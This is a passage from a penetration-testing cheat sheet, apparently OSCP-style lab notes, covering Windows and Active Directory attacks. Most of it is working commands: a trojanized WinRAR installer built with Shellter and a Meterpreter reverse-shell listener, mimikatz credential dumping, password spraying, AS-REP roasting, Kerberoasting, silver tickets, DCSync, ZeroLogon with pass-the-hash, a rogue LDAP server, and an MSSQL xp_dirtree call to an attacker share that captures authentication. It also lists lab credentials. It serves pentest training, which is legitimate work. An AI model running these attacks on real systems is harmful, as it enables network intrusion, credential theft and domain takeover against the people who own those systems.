     msf exploit(multi/handler) > show options   <# Set the correct values #>
     msf exploit(multi/handler) > exploit
     ```
6. Run the PowerShell script
   - You can also decide to convert the script in base64 with [ps_encoder.py](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py) and run it with `powershell.exe -e <BASE64>`
8. Get the meterpreter shell on the attacking machine

### <ins>Shellter</ins>

Note
- [An important tip for Shellter usage](https://www.shellterproject.com/an-important-tip-for-shellter-usage/)

Example of usage
1. Select Auto mode with `A`
2. Selecting a target PE in shellter and performing a backup, in this case the WinRAR installer: `/home/kali/Desktop/winrar-x32-621.exe`
3. Enable stealth mode with `Y`
4. Select a listed payload with `L`
5. Select `meterpreter_reverse_tcp` with `1`
6. Set `LHOST` and `LPORT`
7. Create a listener in Kali with Metasploit
   - `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <IP>;set LPORT <PORT>;run;"`
8. Get the meterpreter shell on the attacking machine


### <ins>Active Directory</ins>

#### <ins>Notes</ins>

| Server | Algorithm available |
| ---    | ---                 |
| Windows 2003 | NTLM |
| Windows Server 2008 or later | NTLM and SHA-1 |
| - Old Windows OS (like Windows 7)<br/> - OS that have it manually set | [WDigest](https://technet.microsoft.com/en-us/library/cc778868(v=ws.10).aspx) |

When you compromise a Domain Controller, you want to be able to get the ntds.dit file
- Contains password hashes
- ticket attack, pass the hash attack, crack the password etc
- generally stored in %SystemRoot%\NTDS


**Misc notes**
- Check for `Domain Admins` and `Service Accounts` groups
- Add an account to a group
  - `net group "<group>" <user> /add /domain`
  - Verify the success of the command with `Get-NetGroup "<group>" | select member`
  - Delete the `<user>` with `/del` instead of `/add`
- Use `gpp-decrypt` to decrypt a given GPP encrypted string
- Note `ActiveDirectoryRights` and `SecurityIdentifier` for each object enumerated during [Object Permissions Enumeration](#bbject-permissions-enumeration)
  - See: [ActiveDirectoryRights Enum (System.DirectoryServices)](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- If you get lost, see the notes for the Hutch, Heist, and Vault machines
- File config for responder: `/usr/share/responder/Responder.conf`
- Do password spray only on local account
  - `Rubeus.exe brute /password:Password1 /noticket`
    - Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
    - `echo 10.10.187.139 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
- Kerberos Abuse: https://blog.spookysec.net/kerberos-abuse/
- To transfer files use smbserver: `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
- Certificate signing request for WinRM: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
  - WinRM shell: https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
- NTLM Auth: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#beyond-root---ntlm-auth
- Not all the usernames found are always the ones that work. For example: you might find autologon creds `svc_loanmanager:Moneymakestheworldgoround!` which however lead to login with `evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`


**Cheat sheets**
- [cheatsheet-active-directory.md](https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md(
- [Cheat Sheet - Active Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
- [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [HackTricks Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Section 18: Active Directory Attacks](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-18-active-directory-attacks)
- [Pentesting_Active_directory mindmap](https://web.archive.org/web/20220607072235/https://www.xmind.net/m/5dypm8/)
- [WADComs](https://wadcoms.github.io/)


**Common Terminology**
- AD Component: trees, forest, domain tree, domain forest
  https://techiepraveen.wordpress.com/2010/09/04/basic-active-directory-components/
- https://tryhackme.com/room/attackingkerberos  Task 1
- More resources:
  https://tryhackme.com/room/attackingkerberos  Task 9


**ACEs**
- ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
- AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
- GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
- The highest permission is `GenericAll`. Note also `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)`


**Services that can be configured for delegation**
- HTTP - Used for web applications to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.


**Basics commands**
- Perform a password reset
  - `Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose`
- Make user change password next logon
  - `Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose`


#### <ins>Manual Enumeration</ins>

#### Legacy Windows applications

```
net user /domain                       display users in the domain
net user <username> /domain            net-user against a specific user
net group /domain                      enumerate groups in the domain
net group "<group-name>" /domain       display members in specific group
```

#### PowerShell and .NET

```
LDAP://host[:port][/DistinguishedName]                                      LDAP path format. CN = Common Name; DC = Domain Component;
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()       domain class from System.DirectoryServices.ActiveDirectory namespace
powershell -ep bypass                                                       bypass the execution policy
([adsi]'').distinguishedName                                                obtain the DN for the domain
```

#### PowerView

```
Import-Module .\PowerView.ps1                                                                                                             Import PowerView; https://powersploit.readthedocs.io/en/latest/Recon/
Get-NetDomain                                                                                                                             Obtain domain information
Get-NetUser | select cn,pwdlastset,lastlogon                                                                                              Obtain users in the domain; username only
Get-NetGroup | select cn                                                                                                                  Obtain groups in the domain
Get-NetGroup "GROUP-NAME" | select member                                                                                                 Enumerate a specific group
Get-NetComputer                                                                                                                           Enumerate the computer objects in the domain
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion                                                               Display OS and hostname
Find-LocalAdminAccess                                                                                                                     Scan domain to find local administrative privileges for our user
Get-NetSession -ComputerName INPUT -Verbose                                                                                               Check logged on users with Get-NetSession
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl                                                   Display permissions on the DefaultSecurity registry hive
Get-NetUser -SPN                                                                                                                          Kerberoastable users
Get-ADGroupMember 'Web Admins'                                                                                                            Get details about a group, in this case, 'Web Admins'
Get-NetUser | select Description                                                                                                          Enumerate the domain users descriptions
Get-NetGroup -GroupName *admin*                                                                                                           Enumerate the domain groups
Get-NetComputer -fulldata | select operatingsystem                                                                                        Find all operating systems running


Get details, in this case, about user svc__apache
-------------------------------------------------
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames


Object Permissions Enumeration
------------------------------
Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll


Domain Shares Enumeration
-------------------------
Find-DomainShare
Invoke-ShareFinder                                                                                                                       Find Domain Shares
```
- See also [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993), [HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview) and [HarmJ0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)


#### From a compromised machine
MMC
  1. Search Bar > Type `mmc` and press enter
  2. See the steps for this app in https://tryhackme.com/room/adenumeration Task 3
Command Prompt
  - `net user /domain`
  - `net user zoe.marshall /domain`
  - `net group /domain`
  - `net group "Tier 1 Admins" /domain`
  - `net accounts /domain`
PowerShell
  - `Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *`
  - `Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A`
  - `Get-ADGroup -Identity Administrators -Server za.tryhackme.com -Properties *`
  - `Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com`
  - `Get-ADGroupMember -Identity "Tier 2 Admins" | Select-Object Name, SamAccountName, DistinguishedName`
  - `$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)`
  - `Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com`
  - `Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com`
  - `Get-ADDomain -Server za.tryhackme.com`
  - `Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
BloodHound`

#### More enumeration

**AD User**
- `Get-ADUser -identity s.smith -properties *`
- If part of Audit Share, see the share `NETLOGON`
- Check the value in `ScriptPath`, they should be available in `NETLOGON`

**Kerberos user enumeration**
- `/home/kali/Documents/windows-attack/active_directory/kerbrute/kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.159.49 usernames.txt`

**Server Manager**
- See event logs with: Event Viewer
- Navigate to the tools tab and select the Active Directory Users and Computers

#### <ins>Initial foothold</ins>
- run `responder` + `mitm6`
- `enum4linux -a -u "" -p "" 192.168.180.30`
- `nmap -Pn -T4 -p- --min-rate=1000 -sV -vvv 10.10.108.190 -oN nmap_results`
- `nmap -p- -A -nP 192.168.212.165 -oN nmap_results`
- `dig @192.168.212.165 AXFR heist.offsec`
- `dnsenum 192.168.174.187`
- After this
  - [ ] 53, zone transfer + info collection
  - [ ] 139/445 Check SMB / smbclient
    - check upload of web shells / phishing
    - check eternal blue
    - check default creds
  - [ ] 389 Check ldapsearch
    - use windapsearch.py
    - try LDAP Pass-back attack
  - [ ] Check rpcclient
  - [ ] Check all services in scope, like web vulnerabilities, ftp etc.
  - [ ] Enumerate any AS-REP / Kerberos roastable users
  - [ ] Check ZeroLogon
  - [ ] Check every section of this file
  - [ ] Check default creds
    - also in Printers, Jenkins etc.
  - [ ] Check: 
    - https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff
    - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
    - https://wadcoms.github.io/ <# interactive cheat-sheet #>
    - https://github.com/seeu-inspace/easyg
  - [ ] 464 kpasswd -> try Kerberoast
  - [ ] Test NFS -> port 111, 2049 (see even if nmap doesn't mark it as NFS)
  - [ ] If you don't find something here, see exploitaiton-notes
  - [ ] Check kerberoasting
    - Not only kerbrute etc., try also to retrieve TGS ticket
    - Test AS-REP roasting and Kerberoasting
    - AS-REP, Kerberost, Rubeus (con e senza creds)
  - [ ] If you find creds / hashes, try:
    - crackmapexec to see a reuse of creds
    - evil-winrm
    - kerberoasting impacket-GetUserSPNs
      - AS-REP, Kerberost, Rubeus
    - enum4linux (once without auth and only once with creds)
      - see descriptions
    - smbclient
    - ldap
- PrivEsc / Post Access
  - [ ] enumerate with bloodhound, powershell, powerview
  - [ ] Check privileges
    - whoami /priv, Get-ADUser -identity s.smith -properties *
  - [ ] try access with rdp
  - [ ] mimikatz.exe
  - [ ] test creds already found
    - crackmapexec, ldap with auth, enum4linux (see descriptions), smbclient
    - kerberoast (AS-REP, Kerberost, Rubeus, etc. -> retrieve TGS)
    - secrets dump, impacket-psexec, impacket-wmiexec, evil-winrm
    - test also hashes
  - [ ] Azure
  - [ ] Play with Rubeus
  - [ ] See DCSync (try with various tools, come aclpwn)
  - [ ] See all sections of this document
  - [ ] See powershell history
  - [ ] Run Seatbelt first, then winPEAS


#### <ins>SMB</ins>
enumeration
- `enum4linux -a -u "" -p "" 192.168.180.21`
- `enum4linux -a -u "Guest" -p "" 192.168.180.21`
- `sudo nmap -vvv -p 137 -sU --script=nbstat.nse 192.168.249.55`
- `nmap -vvv -p 139,445 --script=smb* 192.168.180.21`
- `crackmapexec smb 192.168.180.21 -u 'guest' -p ''`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --shares`
  - see anon logins
  - use flags `--shares` and `--rid-brute`
- `crackmapexec smb 192.168.174.175 -u 'guest' -p ''`
  - see anon logins
  - use flags `--shares` and `--rid-brute` (`SidTypeUser` are users)
- `smbmap -H 192.168.249.55`
- `smbclient \\\\\192.168.249.55\\`
- `smbclient -U '' -L \\\\\192.168.220.240\\`
- `smbclient --no-pass -L //192.168.174.175`
- `smbclient -L //192.168.174.175 -N`
- `impacket-lookupsid vulnnet-rst.local/guest@10.10.146.39 > usernames.txt`
- `cat usernames.txt | grep -i user | awk -F \\'{print $$2}' | awk '{print $1}'`	

connect to share
- `smbclient //192.168.207.116/IPC$`
- `smbclient \\\\\192.168.212.172\\Shenzi`
- `smbclient //192.168.203.172/DocumentsShare -U CRAFT2/thecybergeek`
- If you find a suspicious share, try to upload a lnk file
  - create a shortcut with the command for a reverse shell with `powercat.ps1`
  - `cp link.lnk \\192.168.212.172\DocumentsShare`

mount a share
- `mount -t cifs "//10.10.10.103/Department Shares" /mnt`
  `mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt`
  - from the mounted share, see write perms:
    `find . -type d | while read directory; do touch ${directory}/0xdf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/0xdf; mkdir ${directory}/0xdf 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/0xdf; done`
  - see deleted files:
    `touch {/mnt/ZZ_ARCHIVE/,./}0xdf.{lnk,exe,dll,ini}`

exploitation
- check if this smb hosts files of the web service, it might be possible to upload a shell
- maybe it's possible to do phishing
- `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 192.168.174.187`
  - CVE-2017-0143 EternalBlue
  
change password
- If you find 'STATUS_PASSWORD_MUST_CHANGE': `smbpasswd -r $IP -U sbradley`
- Alternativa: `impacket-smbpasswd -newpass testing1234 sbradley:roastpotatoes@10.10.95.8`


#### <ins>RPC</ins>
- `rpcclient 192.168.180.20 -N`
- `rpcclient 192.168.174.187 -U nik`
- `rpcclient -U "" -N 10.10.10.172`
- Commands: `enumdomusers`, `enumdomgroups`, `querydispinfo`
  - `cat rpc_dump | awk '{print $1}' | cut -f2 -d [ | cut -f1 -d ] > ad_users.txt`
  - After `enumdomusers`, notes the `rid` values, then
    `queryuser RID-HERE`, example `queryuser 0x1f4`
- `impacket-rpcdump @192.168.180.21`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
- Reset password: (see for `svc_helpdesk` accounts)
  `setuserinfo2 username 23 password`



#### <ins>Azure</ins>
- https://blog.xpnsec.com/azuread-connect-for-redteam/
- https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html


#### <ins>LDAP</ins>

- `ldapsearch -v -x -b "DC=resourced,DC=local" -H "ldap://192.168.174.187" "(objectclass=*)"`
  - check descriptions (you might find passwords in descriptions), enumerate users
- `ldapsearch -v -c -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.212.175 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
  - to find Administrator password
  - using creds `fmcsorley:CrabSharkJellyfish192` for domain `HUTCH.OFFSEC`
- `ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ~/Downloads/ldap/`

Domain Enumeration
1. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172`
2. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U --admin-objects`
   - Use the flag `--full` to get full results
3. `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users.txt`
- You can also see wich elements belongs in a group
  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.172 -U -m "Remote Management Users"`
- Find possible passwords
  - `python3 /home/kali/Documents/windows-attack/active_directory/windapsearch/windapsearch.py -u "" --dc-ip 10.10.10.182 -U --full | grep 'Pwd'`

#### <ins>PsLoggedOn</ins>

Download: [PsLoggedOn - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon)
```
.\PsLoggedon.exe \\COMPUTERNAME       See user logons at COMPUTERNAME
```

#### <ins>Service Principal Names Enumeration</ins>

```
setspn -L <username>                                                List the SPNs connected to a certain user account
Get-NetUser -SPN | select samaccountname,serviceprincipalname       List the SPNs accounts in the domain
```

#### <ins>Object Permissions Enumeration</ins>=
```
Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll
```

#### <ins>Domain Shares Enumeration</ins>

```
Find-DomainShare       Find Domain Shares
```

#### <ins>SharpHound</ins>

```
Import-Module .\Sharphound.ps1                                                                  Import SharpHound; https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
Get-Help Invoke-BloodHound                                                                      Learn more about Invoke-BloodHound; To run SharpHound you must first start BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory <DIR> -OutputPrefix "corp audit"       Collect domain data
Invoke-Bloodhound -CollectionMethod All -Domain domain.local -ZipFileName file.zip
```

Alternatives
- `python3 /home/kali/Documents/windows-attack/Scripts/BloodHound.py/bloodhound.py -d heist.offsec -u enox -p california -c all -ns 192.168.212.165`
- `.\SharpHound.exe -c All -d CONTROLLER.local --zipfilename loot.zip`
- `SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs`

#### <ins>BloodHound</ins>

- Note: you need to start Neo4j first with `sudo neo4j start` and then use the command `bloodhound` to start BloodHound.
- Default credentials for Neo4j: `neo4j:neo4j`
- Log in BloodHound with Neo4j's credentials
- Upload here the zip created with SharpHound
- Pre-built queries
  - Find Workstations where Domain Users can RDP
  - Find Servers where Domain Users can RDP
  - Find Computers where Domain Users are Local Admin
  - Shortest Path to Domain Admins from Owned Principals
- Custom queries
  - `MATCH (m:Computer) RETURN m`  to display all computers
  - `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p` to display all active sessions
- Try every query
  - See the groups of the user pwned, query 'Shortest Path to High Value targets'
  - Active Directory security groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators
  - Search for the users / machines owned and mark them as it. Then use the query 'Reachable High Value Targets'


#### <ins>Mimikatz</ins>

After starting `mimikatz.exe`, run the command `privilege::debug` to enable `SeDebugPrivilege` and run `token::elevate`
```
sekurlsa::logonpasswords                                                           Dump the credentials of all logged-on users
sekurlsa::tickets                                                                  Tickets stored in memory
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell       Overpass the Hash
sekurlsa::msv                                                                      Extracting NTLM hashes from LSASS memory
crypto::capi                                                                       Make non-exportable keys exportable; CryptoAPI function
crypto::cng                                                                        Make non-exportable keys exportable; KeyIso service
lsadump::dcsync /user:<domain>\<user>                                              Domain Controller Synchronization
lsadump::lsa /patch                                                                Dump the hashes
```

Other commands to run
- `log`
- `lsadump::sam`
- `lsadump::secrets`
- `lsadump::cache`
- `lsadump::ekeys`

Notes
- If `privilege::debug` doesn't work, try with:
  - `. .\Invoke-PsUACme.ps1`
  - `Invoke-PsUACme -method oobe -Payload "powershell -ExecutionPolicy Bypass -noexit -file C:\temp\mimikatz.exe"`
- You can: steal credentials, generate Kerberos tickets, dump credentials stored in memory and leverage attacks
- A few attacks: Credential dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
- See https://github.com/gentilkiwi/mimikatz/wiki
- The first thing to do is always to run `privilege::debug`
- See: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
- With mimikatz you can turn on the feature widgets. It enables you to see then password in plain text for users that logon and log off
- See also `Invoke-Mimikatz`
- Use `/patch` with a command, it might work
   - esempio: `lsadump::sam /patch`
- https://adsecurity.org/?page_id=1821
- You can also run commands like this: `.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit`, especially if you see the prompt going nuts


#### <ins>Active Directory Authentication Attacks</ins>

#### Password Attacks

With LDAP and ADSI
- Before any attack, check `net accounts` to learn more about account lockouts
- Use the script [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
  - Search wich user has the password `SecretPass123!` with `.\Spray-Passwords.ps1 -Pass SecretPass123! -Admin`
  - Remember to run `powershell -ep bypass` before using scripts

Leveraging SMB
- `crackmapexec smb <IP> -u users.txt -p 'SecretPass123!' -d <domain-name> --continue-on-success` Password spraying
- `crackmapexec smb <domain_name>/<username>:'abd132' -M targets.txt` Spray a specified password `abd132` against all domain joined machines contained in `targets.txt`
- Note: this doesn't take in consideration the password policy of the domain

By obtaining a TGT
- It's possible to use kinit to obtain and cache a Kerberos TGT and automate the process with a script
- It's also possible to use [kerbrute](https://github.com/ropnop/kerbrute) instead
  - `.\kerbrute_windows_amd64.exe passwordspray -d <domain-name> .\usernames.txt "SecretPass123!"`

#### AS-REP Roasting

On Linux
1. `impacket-GetNPUsers -dc-ip <IP-Domain-Controller> -request -outputfile <outuput_file.asreproast> <domain>/<user>` perform AS-REP roasting
2. crack the AS-REP hash
   - `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` 
   - `john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found`

On Windows
1. With [Rubeus](https://github.com/GhostPack/Rubeus), `.\Rubeus.exe asreproast /nowrap` perform AS-REP roasting
2. crack the AS-REP hash
   - `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` 
   - `john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-found`

Alternatives
- From the already hacked machine
  - https://github.com/HarmJ0y/ASREPRoast
  - `. .\ASREPRoast.ps1`
  - `Get-ASREPHash -Domain megacorp.local -Username jorden`
- `UF_DONT_REQUIRE_PREAUTH`
  - https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#get-as-rep-hash


#### Kerberoasting

- see: https://github.com/drak3hft7/Cheat-Sheet---Active-Directory#kerberoast
- Note: if you have a service account (like `svc_apache`) it's possible to kerberoast
  - see powerview command `Get-netuser username`

Retrieve TGS
  - `impacket-GetNPUsers -dc-ip 10.10.153.149 THM.red/thm:'Passw0rd!'`
  - `impacket-GetNPUsers vulnnet-rst.local/t-skid:tj072889 -dc-ip 10.10.146.39 -request`
  Alternatives
  - From a compromised machine: `.\Rubeus.exe kerberoast`, `.\Rubeus.exe kerberoast /nowrap` or `.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972`
  - `impacket-GetUserSPNs lab.enterprise.thm/nik:ToastyBoi! -request`
    - you need to add the domain and IP to /etc/hosts to make this command work

Crack the hash
- `hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O`
- `hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
- Note: you can run commands as another user with `runas` or `Invoke-RunasCs.ps1`
  - `Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/shell.exe'`

#### Silver Tickets

To create a silver ticket, you need:
- SPN password hash
- Domain SID
- Target SPN

1. With mimikatz, run the commands `privilege::debug` and `sekurlsa::logonpasswords` to extract cached AD credentials. Note the NTLM hash of the target user
2. Run on the PowerShell the command `whoami /user` to obtain the domain SID (omit the last 4 digits). Note: you should be able to find it also in the previous step
3. Target an SPN
4. Run `kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<TARGET> /service:<SERVICE> /rc4:<NTLM-HASH> /user:<USER>`
5. Confirm that you have the ticket ready to use in memory with `klist`

**Another way to do it**
1. `impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator`
2. `export KRB5CCNAME=$PWD/Administrator.ccache`
3. `klist`
4. `sudo nano /etc/krb5user.conf`
5. `sudo echo '127.0.0.1       localhost nagoya.nagoya-industries.com NAGOYA-INDUSTRIES.COM' >> /etc/hosts`
6. `impacket-mssqlclient -k nagoya.nagoya-industries.com`
   - `select system_user;`
   - `SELECT * FROM OPENROWSET (BULK 'c:\users\administrator\desktop\proof.txt', SINGLE_CLOB) as correlation_name;`

- Requirement: running in the context of service user (example `svc_mssql`)
- MSSQL, verify if it's running in the context of service user
  1. from kali: `impacket-smbserver -smb2support share /home/kali/Downloads/`
  2. from mssql: `exec xp_dirtree '\\ATTACKERIP\share'`
  3. from `impacket-smbserver`, see the user that tried to authenticate
  - See 'Nagoya' from PG as an example
- If you have a password, you can generate an NTHASH: https://codebeautify.org/ntlm-hash-generator?utm_content=cmp-true
  - There are many tools for this purpose

#### Domain Controller Synchronization (DCSync)

With Bloodhound, use the query 'Find Principals with DCSync Rights'
- Another way to see wich user can DCSync is to see who possesses 'Replication Righs' with `PowerView.ps1`
  - `Get-ObjectACL "DC=htb,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }`

On Linux
1. `impacket-secretsdump -just-dc-user <target-user> <domain>/<user>:"<password>"@<IP>`
2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

On Windows
1. In mimikatz, run the command `lsadump::dcsync /user:<domain>\<user>`, note the Hash NTLM
2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

Another way
- with [aclpwn.py](https://github.com/fox-it/aclpwn.py), `python aclpwn.py -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161 -du neo4j -dp neo4j`

Connect with NTLM
- `evil-winrm -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.10.10.175 -N`
- `impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e`


#### LDAP Pass-back attack

If you find an endpoint where you can connect back to an arbitrary ldap server
- run `nc -vlp 389`
- Host a Rogue LDAP Server
  1. `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
  2. `sudo dpkg-reconfigure -p low slapd`
  3. `nano olcSaslSecProps.ldif`
  4. `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
  5. Verify it: `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`


#### ZeroLogon

- Explanation of ZeroLogon: https://tryhackme.com/room/zer0logon

STEP 1, CHOOSE ONE EXPLOIT
- `python3 '/home/kali/Documents/windows-attack/CVE/ZeroLogon/ZeroLogon by risksense/set_empty_pw.py' DC01 172.16.134.100`
- `python3 '/home/kali/Documents/windows-attack/CVE/ZeroLogon/CVE-2020-1472 Zerologon from SecuraBV/zerologon_tester.py' DC01 192.168.174.187`

STEP 2
- `impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'FABRICORP.LOCAL/FUSE$@10.10.10.193'`
- `impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 MULTIMASTER\$@10.10.10.179`
  - change only `'FABRICORP.LOCAL/FUSE$@10.10.10.193'` >> `DOMAIN/MACHINE$@IP`
  - once secrets are dumped, select users with the following command
    - `awk -F: '{print $1}' hashes.txt | sort | uniq`

STEP 3
- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
- use also a pass the hash attack for administrator
  - `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568 Administrator@10.10.169.118`

STEP 4
- RESTORATION: https://github.com/dirkjanm/CVE-2020-1472#restore-steps


#### Responder SSRF

